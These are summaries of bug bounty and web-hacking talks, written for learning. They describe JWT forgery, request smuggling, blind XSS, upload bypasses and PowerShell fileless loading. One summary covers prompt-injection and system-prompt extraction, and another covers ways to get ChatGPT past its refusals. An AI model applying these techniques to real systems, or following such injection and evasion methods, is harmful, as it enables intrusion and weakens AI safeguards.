The talk argues that a few Linux command-line tools can cover much of a bug bounty recon workflow without heavy automation. The presenter skips basics like cd, pwd and cat and focuses on five commands used regularly during recon and exploitation.

The first tool is curl. The presenter shows how to print a response body, inspect response headers, change the request method, and set headers such as content type and user agent. Request bodies, basic authentication and saving output to a file are also covered. The presenter prefers curl over a proxy for quick API testing. Next is xargs, which turns lines of a file into arguments, runs a command on each line, and helps with simple text transformations such as adding a scheme to every domain. grep follows as a way to search many recon files for keywords, with case-insensitive matching, several patterns at once, regex for domain endings, and exclusion of wildcard entries.

The last tool is jq, used to parse JSON: pulling values and key lists from response data, selecting users by role, counting entries and formatting output. The presenter combines the tools in one workflow. It pulls certificate data for an organization from a search API, extracts common names, removes wildcards, and sorts the unique domains. A bonus segment introduces comm, which compares two sorted subdomain lists so new entries from a later scan stand out. The presenter suggests piping that output into a notification to be alerted when something new appears.

talks.title: Why You Suck at Bug Bounty Hunting (And How To Fix It)
talks.teaser: Lays out common beginner mistakes in bug bounty hunting, from vague goals to low-impact reports and duplicate-prone tooling.
talks.summary:
The talk argues that many people who start bug bounty hunting struggle because of how they approach it, not because they lack ability. Drawing on many mentorship calls, the speaker names recurring mistakes. The first is hunting without a clear goal. The speaker suggests writing goals down and breaking them into smaller steps, such as studying one vulnerability class before hunting it, or working backward from a dollar target by estimating how many medium-severity findings would reach it.

The second mistake is poor program selection. The speaker recommends that beginners start with vulnerability disclosure programs to build a methodology and practice finding issues like XSS, SSRF and IDOR, then move to larger programs with broad functionality or many subdomains. Picking a product or company the hunter genuinely cares about is also encouraged. Next, the speaker warns against filing reports with no real impact. If a hunter cannot explain what harm a bug causes to users or the company's infrastructure, it should not be reported. Repeated duplicates and informative closures often come from relying on the same automated tools as everyone else, so the advice is to master the basic web vulnerabilities by hand before building custom templates.

The closing point is consistency. The speaker compares bug bounty to a video game, where practice sharpens aim and map knowledge. Working alongside others on the same targets and sharing notes can change how someone thinks about a bug. The talk ends with a call for viewers to name which mistake applies to them.

talks.title: HTTP Request Smuggling Explained (with James Kettle)
talks.teaser: Explains HTTP request smuggling as a front-end and back-end desync, then demonstrates exploiting it against a PortSwigger lab.
talks.summary:
The session explains HTTP request smuggling, a flaw in the gap between a front-end server, such as a CDN or load balancer, and the back-end server it forwards to. When both sides share one persistent connection and disagree on where a request ends, an attacker can prepend data that gets attached to another user's request. The talk pairs this with an interview with James Kettle on his research method: start with older RFCs, look for forgotten features such as hop-by-hop header removal, and treat forbidden actions as clues to past breakage.

The hands-on demo uses a PortSwigger lab with a reflected XSS that only fires for the attacker. The presenter first finds which length header the front end trusts by sending conflicting Content-Length and Transfer-Encoding values and watching for errors from each side. Once the desync is confirmed, a smuggled request prefix makes the next visitor's request reach the vulnerable endpoint, with the victim's leftover request absorbed by an unfinished header. Swapping the user agent for a script payload turns the self-XSS into one that fires for that visitor.

The takeaway is that the attack needs no user click and rarely shows up in ordinary logs, so impact can include bypassed authentication, hijacked sessions, cache poisoning and escalated low-severity bugs. Because HTTP/1 requests form an unbroken stream, a smuggled request affects whoever is served next, so exploitation is first-come, first-served unless the attacker keeps sending requests.

talks.title: Lessons Learned From $250,000 In Blind Cross Site Scripting (Blind XSS)!
talks.teaser: Shares practical lessons on finding blind XSS in bug bounty programs using out-of-band payloads and delayed triggers.
talks.summary:
Blind cross-site scripting is a form of XSS where injected JavaScript runs later in someone else's browser, usually inside an internal panel, support tool, or log viewer, so the tester sees no immediate sign of it. The speaker says the technique has earned them more than $250,000 in bounties and shares lessons for finding it reliably.

The first lesson is to drop the standard alert(1) probe in favour of a payload that loads a script from a server you control, such as an image tag with an onerror handler pointing at your host. Each hit then reports when and where it fired and the context it ran in, and hits can be archived and retested later. Second, a payload that stays silent may still fire elsewhere, because one user-supplied field such as a name or bio can be rendered in developer dashboards, analytics, fulfillment tools, and other internal systems the tester cannot reach. Third, some payloads only fire once a human workflow picks them up, so the speaker places them in fields that feed support reviews, refunds, or order checks. This must stay within program scope, and real support staff should not be spammed. A fourth lesson is that a single trigger can reveal internal pages, ticket numbers, and other tabs, which may point to additional entry points.

The overall takeaway is to treat each blind XSS hit as a window into internal workflows, track payloads over time, and follow the trail to chain findings into larger issues.

talks.title: This Tiny JWT Mistake = Massive Bug Bounty
talks.teaser: Explains common JWT attacks like weak secrets and algorithm confusion, and how a shared dev signing key exposed production.
talks.summary:
### Overview
This presentation explores real-world techniques used by attackers to tamper with, forge, and exploit JSON Web Tokens (JWTs) to bypass modern web application authentication. Beyond fundamental vulnerabilities in token implementations, the speaker demonstrates how environment misconfigurations—specifically sharing signing secrets between development and production environments—can lead to severe vulnerabilities such as invite-only bypasses and account takeover.

### Key Topics
- **JWT Architecture and Algorithms**: Structure of JWTs (Base64-encoded header, payload, and signature) and the core distinctions between symmetric signing (HS256 using a shared HMAC secret) and asymmetric signing (RS256 using private/public key pairs).
- **Algorithm Tampering & Weak Secrets**: Exploitation via the `none` algorithm and brute-forcing weak HS256 secret keys using dictionaries like `rockyou.txt` or default secrets sourced from public repositories.
- **Algorithm Confusion Attacks**: Forging tokens by converting an RS256 token to HS256 and signing it using an exposed public verification key as the HMAC secret.
- **Cross-Environment Token Reuse**: Exploiting differences between dev and production access controls when both systems rely on identical signing secrets.
- **Signed Session Cookies and Framework Tokens**: Expanding beyond JWTs to target signed cookies and tokens in frameworks like Django, Flask, and Express.

### Technical Details
- **Algorithm "none" Attack**: Attackers strip the signature, alter the header algorithm to `none`, and craft custom payloads that poorly configured or legacy backends accept without verifying.
- **Secret Key Cracking**: Attackers brute-force HS256 tokens signed with predictable secrets (such as `secret1`, `jwt123`, or `password`) using wordlists like `rockyou.txt` or GitHub scrapers, allowing them to modify user IDs or roles and resign valid tokens.
- **Algorithm Confusion Mechanics**: In misconfigured apps expecting RS256, attackers change the header to HS256. If the server does not enforce the algorithm, it may evaluate the token using its RS256 public key as the HMAC secret key. Attackers obtain this public key—often by fuzzing with `ffuf` or checking within the `/.well-known/` directory—and sign an arbitrary token using that public key.
- **The Dev-to-Prod Case Study**: The speaker discovered an open development instance (`app-dev.site.com`) of an invite-only production web application. After signing up without an invite code on the dev site, the speaker obtained a valid JWT. Because both development and production environments shared the exact same signing key, the speaker submitted the dev token to the production site. The token was accepted, successfully bypassing the invite requirement and logging into an existing account in production.
- **Expanding Scope**: Attackers are encouraged to fingerprint backends and test signed session cookies or framework tokens in Django, Flask, and Express using tools like `Cookie Monster` by Ian Carroll to brute-force predictable keys.

### Takeaways
- **Enforce and Validate Algorithms**: Servers must strictly validate and lock down expected signing algorithms rather than trusting values supplied in token headers.
- **Isolate Environment Secrets**: Development and staging environments must never share signing keys, secrets, or configurations with production.
- **Hacking with an Objective**: Security researchers should focus on maximizing impact—using reconnaissance on development assets to pivot, escalate privileges, access hidden functionality, and impact production targets.

talks.title: How I Got an AI Chatbot to Spill Its Secrets Using Just a Prompt
talks.teaser: Shows how prompt injection tricks a chatbot into leaking its system prompt, bypassing its filters, and following hidden instructions.
talks.summary:
Prompt injection is presented as a way to hijack an AI chatbot through its language rather than its code, by slipping in instructions that override the rules the model follows. The walkthrough starts with extracting the hidden system prompt. A direct request is tried first, then a sentence-completion approach once plain wording is blocked. These can expose the operator's instructions and any private details or links the bot holds.

Next comes direct injection, where a bot told not to be rude is asked to ignore its earlier instructions and insult the user. When plain phrasing is caught by a filter, the demo switches to French, adds spaces between words, inserts special characters, and wraps the request in a code block. Combining these techniques succeeds where each one alone failed. The final demo is indirect injection: a comment carrying a hidden instruction is planted in a project management tool, and when the assistant later summarises the comments, it follows the planted command and reveals a flag.

The takeaway is that these models match patterns rather than reason about intent, so keyword-based filters are easy to evade. Defenders need to detect malicious intent even when instructions are disguised or arrive inside trusted content the model reads.

talks.title: The No BS Bug Bounty & Web Hacking Roadmap
talks.teaser: Lays out a beginner's path into bug bounty hunting, from Linux and web basics to free labs and first programs.
talks.summary:
The talk argues that certifications are not needed to start in bug bounty hunting. The speaker says most of the required material is free online and names three traits that matter more: consistency, curiosity and commitment. Bug bounty work is presented as a way to build a practical portfolio that employers can check against real systems.

The roadmap moves in stages. Learners start with Linux basics on Ubuntu and interactive command-line courses, then cover networking concepts such as IP addresses, DNS, ports and HTTP. Web fundamentals follow, covering HTML, JavaScript and how browsers talk to servers, with a small project that serves a form page through Apache. Core tools are an intercepting proxy such as Caido or Burp Suite, browser developer tools, and recon with Subfinder and httpx to find live subdomains.

For practice, the talk recommends PortSwigger's Web Security Academy as the main free resource, plus Hack The Box for harder challenges. Beginners should read public disclosure reports, work through vulnerability disclosure programs before paid bounties, and join community spaces. The closing example follows SSRF: learning HTTP, redirects and JavaScript along the way leads to a working proof of concept. The takeaway is to pick one vulnerability class and study it deeply.

talks.title: PowerShell for Hackers
talks.teaser: Shows how attackers abuse built-in PowerShell features for reconnaissance, fileless code loading and remote payload delivery.
talks.summary:
This opening episode of a three-part series looks at PowerShell from an attacker's side, aimed at viewers who are new to it. The guest points out that PowerShell ships with Windows and that administrators rarely treat it as an attack surface. One example is using netsh to list saved Wi-Fi profiles and reveal a stored key, which can support reconnaissance and onward movement.

The discussion then turns to living off the land. The LOLBAS project catalogues built-in Windows binaries and scripts that can be misused, and a PowerShell module from the guest can check which of them exist on a given host. Installing modules is often noticed or blocked, so the guest shows loading code directly from a PowerShell Gallery page into memory without writing a file. Among the download cmdlets, Invoke-WebRequest returns status, headers and content, while Invoke-RestMethod returns only the body. Piping retrieved text into Invoke-Expression runs it immediately, and the guest notes that this cmdlet is among the most closely watched by defenders because it is a common route for loading malware.

The episode ends with less common download methods that are less likely to trigger alerts, and advice for newcomers: read LOLBAS entries, explore commands with Get-Command, and ask AI tools to explain unfamiliar code. The main takeaway for defenders is that built-in features, not custom tooling, are often the means of attack, so script execution and download cmdlets deserve monitoring.

talks.title: This CTF Teaches You Everything About Hacking an API
talks.teaser: Walks through a web API capture-the-flag, from leaked identifiers to role bypasses through legacy endpoints and deny-list authorization.
talks.summary:
The walkthrough covers a web API capture-the-flag exercise built around a fictional meeting-coordination app. The presenter imports the API documentation into Swagger, registers an account, and logs in to get a bearer token. The early challenges depend on spotting data that leaks more than the interface shows: a review-related endpoint exposes a user ID, and paging through location results in Caido reveals a group ID.

The hardest step is forging a token with a higher role. JWT cracking and mass assignment get nowhere. Requesting API v1 is rejected, but the legacy version is accepted, and its check is a deny list rather than an allow list. Deleting the test account removes the user role that blocks access, so the legacy token unlocks the support summary. Fuzzing an integer-based ticket endpoint leaks the full content of tickets, including a note about short-lived tokens and a hidden endpoint that only accepts POST.

The remaining steps involve brute-forcing a location ID, using a group chat endpoint to recover a password, and sending a crafted request that combines the group, location, invite code and user IDs to get the final flag. The main takeaways are that innocent-looking features can leak identifiers, that older API versions often reintroduce fixed flaws, and that deny-list authorization is easy to bypass by changing the role.

talks.title: This Hacker Scored $5,000 with a Remote Code Execution Exploit!
talks.teaser: Walks through how a magic-byte check and a PHP upload bypass led to remote command execution on a public bug bounty program.
talks.summary:
The talk follows a bug bounty hunter who found a remote command execution flaw in a Netflix web application. Starting from a list of subdomains, he used httpx to check status codes, redirects and detected technologies, dropping hosts that redirected to login pages and keeping those that returned a 200 response. He then identified the back end as PHP and reviewed the site's JavaScript for API endpoints that were not linked from the user interface.

The vulnerable feature was a file upload form that sent the image data in the Content-Disposition part of the request. Changing the content type did not help, but adding a GIF magic-byte header to the start of a PHP file got past the server's check. The server validated only those leading bytes and did not check the file extension, so the PHP script was stored. The speaker demonstrated the same flow on a practice lab, where a script took a command from a query parameter and returned its output.

The speaker reported the issue and received a $5,000 bounty after about a week of focused testing. A second instance of the same flaw on a domain in another language was marked as a duplicate, but Netflix added a $500 bonus for it. He had been doing bug bounty work full-time for about six months before this first paid find. The takeaway is that upload checks based only on magic bytes or content type are not enough, and that working methodically through a large subdomain list can surface overlooked endpoints.

talks.title: I Scanned 100,000+ Subdomains For CVE-2025-29927
talks.teaser: Shows how a known Next.js auth bypass was hunted across many subdomains and what the exploited apps exposed.
talks.summary:
The talk covers hunting CVE-2025-29927, a Next.js flaw that let a crafted request skip middleware authorization checks, across a large set of bug bounty subdomains. The speaker gathered subdomains from many passive sources with Subfinder, then spread the scan across about twenty small cloud machines using Axiom. Nuclei flagged hosts that answered with a 307 redirect and a Next.js redirect header, a behaviour described in public research as a sign of a vulnerable instance.

Flagged hosts were then run through httpx with a broader bypass payload covering different Next.js versions and route structures, and every response was screenshotted so likely dashboards could be spotted at a glance. The speaker sorted the results into outcomes. Some apps gave full access to read-only internal dashboards, and a few also allowed data to be modified. Others showed a login screen that blocked the UI, but their API calls returned 200 instead of 401, so requests could be crafted directly by reading the JavaScript. A last group appeared bypassed yet exposed no routes or API calls, which the speaker suspects are guarded by a secondary session or cookie check.

The takeaways are that automation only gets part of the way, so understanding how the vulnerability works matters more than running payloads. Web application firewalls were a shaky defence against this header-based trick, and authentication should be examined across the whole application stack. Rebuilding the issue in a local test app first helped the speaker understand it before hunting.

talks.title: This Simple URL Encoding Made me $50,000 in Bounties
talks.teaser: Shows how a URL-encoded path bypasses access controls on Spring Boot actuators and exposes a heap dump with tokens.
talks.summary:
The talk explains why Java applications are attractive targets in bug bounty work, focusing on Spring Boot actuators. These diagnostic endpoints can expose health data, metrics, configuration, environment variables and memory dumps. The speaker notes that as scanners and stricter access controls make obvious actuator paths harder to find, hunters need to map API structures, including application name prefixes, and watch for unusual responses such as a custom "forbidden" error where a 404 would normally appear.

The demonstration shows a URL-encoded path, where the letter r is written as %72 and double-encoded as %2572, reaching an actuator that a blocked plain path could not. Using Nuclei with a custom template, the speaker probes a generic API path, which finds nothing, then an application-specific path, which reveals the actuator. The available endpoints are checked, and the heap dump is downloaded with curl and saved to a file.

Inspecting the heap dump with strings and grep, the speaker searches for cookies, passwords, the JWT prefix "eyJ", bearer and basic authorization keywords, and company-specific header names. A valid token is recovered this way. The takeaway is that an exposed actuator alone may be a modest finding, but showing access to credentials and what they unlock makes a much stronger report.

talks.title: This is How a Simple IDOR Earned Me a Max Bug Bounty Payout
talks.teaser: Shows how a predictable username pattern and a simple IDOR in a public API exposed personal data at scale.
talks.summary:
The talk walks through how a broken access control flaw in a financial company's public API exposed personal data for many users. The target was a login and contact page on a long-registered domain, with little else to explore. Searching GitHub for the domain surfaced an API endpoint that returned personal details when a username was supplied. The initial report was rated medium severity because an attacker first needed a valid username.

Simple guesses such as common names and numeric IDs failed, but usernames appeared to follow a pattern: first initial, last name, and possibly a birth year. An AI chatbot supplied common Hispanic surnames, and some combinations returned other users' records. A generated script then tried each letter from A to Z with those surnames and years from 1960 to 1999, flagging HTTP 200 responses. The speaker opened only a couple of results to limit exposure of personal information, and passed the pattern and the valid usernames to the program.

The main lesson is that GitHub recon, basic automation and AI assistance can expose serious flaws without advanced techniques. The domain was not buried under obscure subdomains, and the program had been public for over three years with many testers. Practitioners should revisit obvious targets and examine how identifiers are generated, since critical issues can still sit in plain view.

talks.title: How Ethical Hackers ACTUALLY Use ChatGPT With Real Examples
talks.teaser: Shows how security testers structure ChatGPT prompts for payload crafting, JavaScript analysis and getting past model refusals.
talks.summary:
The talk argues that generic prompt formulas fall short for security work. Technical tasks need precision, model output often goes straight into a proxy or a script, and models frequently refuse or lecture on offensive requests. The presenter proposes a six-part prompt structure for hacking: a legitimacy statement, the task, technical context about the target, output constraints for the destination tool, knowledge boundaries stating what the tester already understands, and success criteria for judging the reply.

To illustrate, the presenter walks through three prompts. The first asks for five XSS payloads that avoid blocked characters and a length limit, with a short explanation for each one. The second requests advanced SSRF payloads that target IP blacklisting and URL filtering, and can be extended into a Python script that sends them and shows each server response. The third feeds JavaScript from a web application into a model and asks for documented endpoints, parameters, headers, ready-to-use curl commands, raw HTTP requests for a proxy, and a list of potential vulnerabilities, formatted as markdown.

For getting past refusals, the presenter recommends being very specific and technical, framing requests as study for a certification, and stating that a working exploit is not needed when only the concept matters. Complex exploit chains should be split into smaller questions and solved piece by piece. The closing point is that AI output must be checked before use in a real assessment, since models can hallucinate, and the tools add to a tester's skills rather than replace them.

talks.title: Give Me 13 Minutes and This Will Be Your Best Bug Bounty Year
talks.teaser: Presents a methodology for bug bounty hunting that focuses on business impact rather than random scanning.
talks.summary:
The talk argues that successful bug bounty hunters work from a method instead of running the same scanners as everyone else. It names three foundations: understanding how modern web applications connect, keeping the toolset simple with an intercepting proxy and basic scripting, and mapping an application before testing it. Hunting with a purpose means asking what would hurt the business most.

On target selection, the speaker recommends programs with large attack surfaces and products you use yourself, since daily use reveals odd behaviour and UI changes. Business impact drives the search: banks face unauthorized fund access, social platforms face account takeover, and shops face price manipulation or data leaks. Examples include a $9,000 SQL injection on Yahoo and a $100,000 Facebook ad platform bug found by studying how ad systems work. Chaining a small XSS with an OAuth weakness toward account takeover raises severity. Logic flaws come from developer assumptions, such as discounts applied after checkout or steps in registration and invite flows that can be reordered.

To sustain results, the speaker says to change perspective instead of target when bugs dry up, such as moving from client-side issues to APIs or a developer platform, and to watch JavaScript files and new API imports across releases. Taking breaks guards against burnout. The closing point is that reports begin with conversations with security teams, and a reputation for expertise turns hunters into trusted partners.

talks.title: I Used AI To Hack This Site
talks.teaser: Shows how ChatGPT handles SSRF lab challenges, where it finds bypasses quickly but needs guidance on blind exfiltration.
talks.summary:
The talk asks whether AI will replace bug bounty hunters and web hackers, and tests that question by giving ChatGPT several server-side request forgery (SSRF) labs from a web security course. In the first lab, requests to localhost were blocked. The model suggested alternative ways to write the address, and one of them, a zero-based notation, got past the filter. The second lab allowed only one domain. The model's first ideas, including domain tricks, URL parsing tricks using an @ character, and DNS rebinding, failed. It only reached a working path after the presenter pointed out an open redirect on the site, which was then used to reach the internal host.

The third lab involved blind SSRF, where the server's response is not visible, so data has to be leaked out another way. The model's suggestions included time-based, error-based and open redirect approaches, which the presenter judged unsuitable. Once the presenter narrowed the request to hosting a JavaScript file that makes the internal request and sends the result to a callback listener, the generated script still failed to produce a useful request. The presenter then supplied a hand-written working script and asked the model to adapt it. The callback then carried encoded data, which the model decoded to reveal the lab's answer.

The presenter's conclusion is that current general-purpose models are not ready to replace experienced hunters. They were useful for brainstorming known techniques and saving time, but their answers varied between attempts and they needed specific direction. A practitioner could take away that such tools work best as a shortcut for ideas they already understand, with the human still validating each step.

talks.title: Build a Recon & Lead Generation Box for Under $60
talks.teaser: Shows how a low-cost cloud box runs passive archive and active crawling recon to turn assets into bug bounty leads.
talks.summary:
Reconnaissance is framed here as lead generation for bug bounty work rather than running as many tools as possible. The speaker contrasts active crawling, which maps a live application the way a person walks through a building, with passive discovery, which pulls historical URLs from web archives without sending requests to the target. Running these tools from a cheap cloud VPS is recommended so aggressive crawling does not get a home IP banned.

The demo starts with a subdomain whose root returns a 404, where a crawler has nothing to work with. Collecting Wayback URLs for that host returns paths a wordlist would likely miss, including a password-protected login, an endpoint carrying identifiers, and unusual folder names. Filtering the list with httpx by status code, such as reviewing 200 and 401 responses, turns a large archive into a shortlist, and screenshots of 200 responses can document a possible data leak. Next, a JavaScript-aware Katana crawl of a training target shows endpoints reachable anonymously. Rerunning the crawl with a session cookie exposes more functionality behind login.

The takeaway is to choose the method based on what the target serves. Passive archives suit dead ends and 404 responses, active crawling suits live content, and authenticated crawling is needed for logged-in areas, since fully mapping a large application is difficult. Combining these outputs with httpx triage helps focus manual testing on the most promising routes.
